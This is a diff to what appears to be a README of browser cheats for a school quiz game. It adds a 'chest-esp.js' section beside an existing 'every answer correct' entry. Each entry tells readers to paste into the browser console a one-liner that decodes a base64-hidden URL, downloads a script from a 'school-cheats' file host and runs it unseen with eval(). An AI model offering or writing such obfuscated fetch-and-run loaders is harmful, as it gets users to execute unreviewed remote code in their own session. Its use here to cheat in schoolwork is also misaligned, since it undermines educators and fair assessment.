@@ -30,4 +30,11 @@ Open console (ctrl + shift + j) and paste the following:
 fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEV2ZXJ5QW5zd2VyQ29ycmVjdC5qcw==')).then((res) => res.text().then((t) => eval(t)))
 ```
 
+## <a id="chest-esp.js"></a>chest-esp.js
+
+Open console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dvbGRDaGVzdEVTUC5qcw==')).then((res) => res.text().then((t) => eval(t)))
+```
+
 ## More hacks are coming soon if someone coments on this with more working hacks i will add them
